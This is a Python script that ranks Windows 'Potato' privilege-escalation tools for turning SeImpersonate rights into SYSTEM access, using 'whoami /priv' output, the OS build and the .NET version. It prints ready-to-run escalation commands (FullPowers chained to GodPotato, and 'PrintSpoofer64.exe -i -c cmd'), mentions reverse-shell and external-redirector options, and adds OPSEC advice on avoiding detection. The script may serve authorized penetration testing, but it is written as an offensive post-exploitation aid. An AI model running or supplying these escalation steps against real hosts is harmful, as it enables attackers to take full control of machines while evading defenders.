#!/usr/bin/env python3
"""
check_potato.py - Decide which SeImpersonate "Potato" to fire on a given host.

Encodes the 2024-2026 Potato selection matrix. Feed it the output of `whoami /priv`, an OS/build
string, the installed .NET version, and whether outbound :135 is allowed, and it ranks the variants
most likely to succeed (and tells you if FullPowers is needed for a stripped service token first).

USAGE
    # Paste whoami /priv directly:
    python3 check_potato.py --priv "$(cat priv.txt)" --os "Windows Server 2022" --dotnet 4 --user "iis apppool\\web"
    python3 check_potato.py --priv-file priv.txt --os "Windows 10 22H2" --dotnet 4
    python3 check_potato.py --os "Server 2019" --outbound135        # assume SeImpersonate present

DEPENDENCIES
    Python 3.8+ (stdlib only).
NOTES
    Advisory only — exploitability varies by patch level/runtime; iterate if the top pick fails.
    OPSEC: choosing correctly minimizes the tell-tale "SYSTEM child of service worker" attempts.
"""
import argparse
import re
import sys

IMP = ("seimpersonateprivilege", "seassignprimarytokenprivilege")
STRIPPED_ACCOUNTS = ("network service", "local service", "iis apppool")


def detect_os(s):
    s = (s or "").lower()
    # returns (family, build_rank) where higher rank = newer
    if "24h2" in s or "2025" in s:
        return ("win11_2025", 6)
    if "11" in s or "2022" in s:
        return ("win11_2022", 5)
    if "2019" in s:
        return ("server2019", 4)
    if "10" in s:
        return ("win10", 3)
    if "2016" in s:
        return ("server2016", 2)
    if "2012" in s or "8" in s:
        return ("server2012", 1)
    return ("unknown", 3)


def rank_potatoes(family, rank, dotnet, outbound135):
    """Return ordered list of (variant, reason)."""
    out = []
    net = f"-NET{dotnet}" if dotnet in (2, 35, 4) else "-NET4"
    # GodPotato: 2012-2022, no outbound, default modern pick
    if 1 <= rank <= 5:
        out.append((f"GodPotato{net}.exe", "DCOM/OXID local, no outbound; pick exe matching installed .NET"))
    # SigmaPotato: fileless reflection, same coverage as GodPotato
    if 1 <= rank <= 5:
        out.append(("SigmaPotato.exe (--revshell / reflection)", "fileless .NET-reflection fork; use when stealth matters / no disk write"))
    # PrintNotifyPotato: pure COM, Defender-resilient, Win10/11 + 2012-2022
    if rank >= 3:
        out.append(("PrintNotifyPotato.exe", "pure COM (no RPC redirector); drop-in when Defender blocks RoguePotato"))
    # DCOMPotato: includes Server 2022
    if rank >= 4:
        out.append(("McpManagementPotato.exe / PrinterNotifyPotato.exe", "service-DCOM @ IMP level; McpManagement works on Server 2022"))
    # EfsPotato: broad if EFSRPC reachable
    out.append(("SharpEfsPotato.exe", "MS-EFSR coercion; try if EFSRPC pipe reachable"))
    # RoguePotato: Server 2019 with outbound 135
    if family == "server2019":
        if outbound135:
            out.insert(2, ("RoguePotato.exe (-r <redirector> -e 135)", "OXID via external redirector; needs outbound :135"))
        else:
            out.append(("RoguePotato.exe", "NEEDS outbound :135 to your redirector — not available per flags"))
    # PrintSpoofer: classic spooler path, 2016-2019
    if rank in (2, 4):
        out.append(("PrintSpoofer64.exe -i -c cmd", "Spooler named pipe; broken if Spooler disabled"))
    # Legacy
    if rank <= 2:
        out.append(("JuicyPotatoNG.exe", "legacy DCOM CLSID; last resort on <=2016"))
    if family == "win11_2025":
        out.insert(0, ("GodPotato / SigmaPotato / PrintNotifyPotato (verify live)",
                       "No dedicated Server 2025 variant confirmed; shared DCOM arch usually works — test on target"))
    return out


def main():
    ap = argparse.ArgumentParser(description="Recommend a Potato variant for SeImpersonate -> SYSTEM")
    ap.add_argument("--priv", help="text of `whoami /priv`")
    ap.add_argument("--priv-file", help="file containing `whoami /priv` output")
    ap.add_argument("--os", default="", help='OS/build string, e.g. "Windows Server 2022" / "Windows 11 24H2"')
    ap.add_argument("--dotnet", type=int, default=4, choices=[2, 35, 4], help="installed .NET runtime (for GodPotato exe)")
    ap.add_argument("--user", default="", help="current user (to detect stripped service tokens)")
    ap.add_argument("--outbound135", action="store_true", help="outbound TCP/135 to your redirector is allowed")
    args = ap.parse_args()

    priv_text = args.priv or ""
    if args.priv_file:
        try:
            with open(args.priv_file, encoding="utf-8", errors="ignore") as fh:
                priv_text += "\n" + fh.read()
        except OSError as e:
            sys.exit(f"[-] cannot read {args.priv_file}: {e}")

    pt = priv_text.lower()
    has_imp = any(p in pt for p in IMP) if priv_text else True  # assume present if no priv given
    user = args.user.lower()

    print("=== Potato selection ===")
    if priv_text and not has_imp:
        if any(a in user for a in STRIPPED_ACCOUNTS) or any(a in pt for a in STRIPPED_ACCOUNTS):
            print("[!] No SeImpersonate/SeAssignPrimaryToken in token, but account is a service identity.")
            print("    -> Token is likely FILTERED. Recover first:")
            print("       FullPowers.exe -c \"C:\\Windows\\Tasks\\GodPotato-NET4.exe -cmd cmd\" -z")
            print("    Then re-run with the recovered token.\n")
        else:
            print("[-] No SeImpersonate/SeAssignPrimaryToken privilege and not a known service account.")
            print("    Potato family is NOT applicable. Try service/DLL/kernel paths instead.")
            return
    else:
        print("[+] SeImpersonate / SeAssignPrimaryToken present (or assumed). Potato family applies.\n")

    family, rank = detect_os(args.os)
    print(f"[*] OS family={family} rank={rank} dotnet=NET{args.dotnet} outbound135={args.outbound135}\n")
    print("Ranked candidates (try top-down; iterate if one fails):")
    for i, (variant, reason) in enumerate(rank_potatoes(family, rank, args.dotnet, args.outbound135), 1):
        print(f"  {i:>2}. {variant}")
        print(f"      {reason}")


if __name__ == "__main__":
    main()
